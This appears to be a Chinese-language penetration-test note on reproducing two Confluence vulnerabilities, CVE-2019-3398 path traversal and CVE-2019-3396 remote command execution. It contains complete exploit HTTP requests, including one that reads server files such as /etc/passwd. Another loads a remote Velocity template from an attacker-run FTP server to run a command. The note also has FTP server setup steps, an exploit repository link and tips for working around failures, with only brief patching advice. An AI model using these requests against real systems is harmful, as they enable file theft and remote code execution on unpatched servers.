记





在一次授权测试中遇到Confluence这个系统。这个系统爆出过rce漏洞，不过老洞利用起来总会踩坑，毕竟网上老洞的文章还是比较少的，所以这里小记一下。



简介





Atlassian Confluence(简称Confluence)是一个专业的wiki程序。 它是一个知识管理的工具,通过它可以实现团队成员之间的协作和知识共享





漏洞





路径穿越读取文件CVE-2019-3398

命令执行CVE-2019-3396





漏洞复现



路径穿越漏洞





使用burpsuite发送以下请求包


POST /rest/tinymce/1/macro/preview HTTP/1.1Host: x.x.x.x:xxxxAccept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeReferer: https:// x.x.x.x:xxxx /pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&Content-Type: application/json; charset=utf-8Content-Length: 203 {"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"../web.xml"}}}





6.12以前的Confluence没有限制文件读取的协议和路径，我们可以使用file:///etc/passwd来读取文件，也可以通过https://...来加载远程文件。




命令执行漏洞





先在vps上使用python搭建ftp服务

这里注意ftp与https都可，http不行








安装python模块pip install pyftpdlib

在exp目录执行python -m pyftpdlib -p 21











使用burpsuite发送以下请求包



POST /rest/tinymce/1/macro/preview HTTP/1.1Host: x.x.x.x:xxxxAccept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeReferer: https:// x.x.x.x:xxxx /pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&Content-Type: application/json; charset=utf-8Content-Length: 203 {"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"ftp://1.1.1.1:21/rce.vm","cmd":"whoami"}}}


修复建议





1、升级Confluence版本

2、主动升级widgetconnector-3.1.3.jar到3.1.4或更高版本






exp文件


https://github.com/Yt1g3r/CVE-2019-3396_EXP

踩坑





1.python开启ftp服务，python -m SimpleHTTPServer 这条命令在这个漏洞中无效

2. _template的远程文件加载推荐使用ftp实现，https我是没成功

3.注意使用whoami通用命令，不一定是啥系统
